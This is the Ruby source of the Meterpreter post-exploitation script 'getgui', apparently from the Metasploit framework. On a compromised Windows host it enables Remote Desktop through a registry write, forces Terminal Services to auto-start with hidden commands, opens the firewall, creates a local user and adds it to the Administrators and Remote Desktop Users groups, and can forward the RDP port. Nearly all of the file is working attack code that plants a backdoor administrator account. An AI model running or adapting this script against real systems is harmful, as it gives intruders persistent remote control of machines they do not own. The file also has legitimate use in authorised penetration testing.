# $Id$
#
# Meterpreter script for enabling Remote Desktop on Windows 2003, Windows Vista
# Windows 2008 and Windows XP targets using native windows commands.
# Provided by Carlos Perez at carlos_perez[at]darkoperator.com
# Support for German Systems added by L0rdAli3n debian5[at]web.de
# Version: 0.1.2
# Note: Port Forwarding option provided by Natron at natron[at]invisibledenizen.org
#      We are still working in making this option more stable.
################## Variable Declarations ##################

session = client
@@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ],
	"-e" => [ false, "Enable RDP only." ],
	"-l" => [ true, "The language switch\n\t\tPossible Options: 'de_DE', 'en_EN' / default is: 'en_EN'" ],
	"-p" => [ true,  "The Password of the user to add." ],
	"-u" => [ true,  "The Username of the user to add." ],
	"-f" => [ true,  "Forward RDP Connection." ]
)
def usage
	print_line("Windows Remote Desktop Enabler Meterpreter Script")
	print_line("Usage: getgui -u <username> -p <password>")
	print_line("Or:    getgui -e")
	print(@@exec_opts.usage)
	raise Rex::Script::Completed
end


def langdetect(session, lang)
	if lang != nil
		print_status("Language set by user to: '#{lang}'")
	else
		print_status("Language detection started")
		lang = client.sys.config.sysinfo['System Language']
		if lang != nil
			print_status("\tLanguage detected: #{lang}")
		else
			print_error("\tLanguage detection failed, falling back to default 'en_EN'")
			lang = "en_EN"
		end
	end
	rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
end


def enablerd(session)
	key = 'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server'
	root_key, base_key = session.sys.registry.splitkey(key)
	value = "fDenyTSConnections"
	begin
	open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)
	v = open_key.query_value(value)
	print_status "Enabling Remote Desktop"
	if v.data == 1
		print_status "\tRDP is disabled; enabling it ..."
		open_key = session.sys.registry.open_key(root_key, base_key, KEY_WRITE)
		open_key.set_value(value, session.sys.registry.type2str("REG_DWORD"), 0)
	else
		print_status "\tRDP is already enabled"
	end
	rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
	end

end


def enabletssrv(session)
	tmpout = [ ]
	cmdout = []
	key2 = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\TermService"
	root_key2, base_key2 = session.sys.registry.splitkey(key2)
	value2 = "Start"
	begin
	open_key = session.sys.registry.open_key(root_key2, base_key2, KEY_READ)
	v2 = open_key.query_value(value2)
	print_status "Setting Terminal Services service startup mode"
	if v2.data != 2
		print_status "\tThe Terminal Services service is not set to auto, changing it to auto ..."
		cmmds = [ 'sc config termservice start= auto', "sc start termservice", ]
		cmmds. each do |cmd|
			r = session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
			while(d = r.channel.read)
				tmpout << d
			end
			cmdout << tmpout
			r.channel.close
			r.close
			end
	else
		print_status "\tTerminal Services service is already set to auto"
	end
	#Enabling Exception on the Firewall
	print_status "\tOpening port in local firewall if necessary"
	r = session.sys.process.execute('netsh firewall set service type = remotedesktop mode = enable', nil, {'Hidden' => true, 'Channelized' => true})
	while(d = r.channel.read)
		tmpout << d
	end
	cmdout << tmpout
	r.channel.close
	r.close
	rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
	end
end



def addrdpusr(session, username, password, lang)
	# Changing the group names depending on the selected language
	case lang
		when "en_EN"
			rdu = "Remote Desktop Users"
			admin = "Administrators"
		when "de_DE"
			rdu = "Remotedesktopbenutzer"
			admin = "Administratoren"
	end
	tmpout = [ ]
	cmdout = []
	print_status "Setting user account for logon"
	print_status "\tAdding User: #{username} with Password: #{password}"
	begin
	r = session.sys.process.execute("net user #{username} #{password} /add", nil, {'Hidden' => true, 'Channelized' => true})
	while(d = r.channel.read)
		tmpout << d
	end
	cmdout << tmpout
	r.channel.close
	r.close
	print_status "\tAdding User: #{username} to local group '#{rdu}'"
	r = session.sys.process.execute("net localgroup \"#{rdu}\" #{username} /add", nil, {'Hidden' => true, 'Channelized' => true})
	while(d = r.channel.read)
		tmpout << d
	end
	cmdout << tmpout
	r.channel.close
	r.close
	print_status "\tAdding User: #{username} to local group '#{admin}'"
	r = session.sys.process.execute("net localgroup #{admin}  #{username} /add", nil, {'Hidden' => true, 'Channelized' => true})
	while(d = r.channel.read)
		tmpout << d
	end
	cmdout << tmpout
	r.channel.close
	r.close
	print_status "You can now login with the created user"
	rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
	end
end


def message
	print_status "Windows Remote Desktop Configuration Meterpreter Script by Darkoperator"
	print_status "Carlos Perez carlos_perez@darkoperator.com"
end
################## MAIN ##################
# Parsing of Options
usr = nil
pass = nil
lang = nil
lport = 1024 + rand(1024)
enbl = nil
frwrd = nil

@@exec_opts.parse(args) { |opt, idx, val|
	case opt
		when "-u"
			usr = val
		when "-p"
			pass = val
		when "-h"
			usage
		when "-l"
			lang = val
		when "-f"
			frwrd = true
			lport = val
		when "-e"
			enbl = true
		end

}
if enbl
	message
	enablerd(session)
	enabletssrv(session)

elsif usr != nil && pass != nil
	message
	langdetect(session, lang)
	enablerd(session)
	enabletssrv(session)
	addrdpusr(session, usr, pass, lang)

else
	usage
end
if frwrd == true
	print_status("Starting the port forwarding at local port #{lport}")
	client.run_cmd("portfwd add -L 0.0.0.0 -l #{lport} -p 3389 -r 127.0.0.1")
end

